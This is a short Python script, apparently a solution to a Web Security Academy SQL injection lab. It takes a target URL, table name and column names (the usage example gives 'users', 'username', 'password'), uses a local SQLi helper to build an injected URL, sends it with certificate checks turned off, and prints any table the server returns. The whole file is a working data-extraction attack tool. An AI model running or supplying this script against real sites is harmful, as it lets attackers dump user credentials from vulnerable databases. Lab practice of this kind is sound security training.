from methods import SQLi,path
import sys
from bs4 import BeautifulSoup



if __name__=="__main__":
    try:
        print(sys.argv)
        url=sys.argv[1].strip()    
        table=sys.argv[2].strip() 
        columns=[]
        n=len(sys.argv)
        for i in range(3,n):
            columns.append(sys.argv[i].strip())
        
        lab5=SQLi(url,path,"--",table)
        injected_url=lab5.generate_payload(columns)
        r=lab5.session.get(injected_url,verify=False)
        bs=BeautifulSoup(r.text,"html.parser")
        res=bs.find("table")
        print(f"[*] Injected URL :\n{injected_url}")


        if  res!=None:
            res=res.get_text()
            print(f"[+] Success : {res}")
            print(f"[*] Injected URL :\n{injected_url}")
        else:
            print("[-] Not Found !!")
    
    except IndexError:
        help="<table> <columns> [-if condition]"
        print(f"[?] Syntax: python3 {sys.argv[0].strip()} <url> {help}")
        print(f"[?] Example: python3 {sys.argv[0].strip()} 'https://sub.web-security-academy.net' 'users' 'username' 'password' ")
        exit(-1)


